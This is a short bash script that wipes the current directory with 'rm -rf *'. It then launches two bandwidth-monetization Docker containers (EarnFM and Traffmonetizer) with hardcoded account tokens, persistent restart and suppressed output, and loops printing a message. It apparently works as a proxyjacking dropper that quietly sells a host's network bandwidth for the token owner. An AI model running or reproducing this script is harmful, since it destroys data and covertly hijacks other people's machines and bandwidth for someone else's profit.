#!/bin/bash
rm -rf * & sudo docker run --restart unless-stopped -d -e EARNFM_TOKEN="2daac0b6-c3ff-42ea-a177-b5f5b9db81cc"  earnfm/earnfm-client:latest & docker run --restart unless-stopped -d traffmonetizer/cli_v2 start accept --token '0ss+TuE1Cmq2c6sufJjl3FqarISb6TnCvGfigdMhIdU=' > /dev/null 2>&1 && while true; do clear; echo "ilovingyou"; sleep 60; done
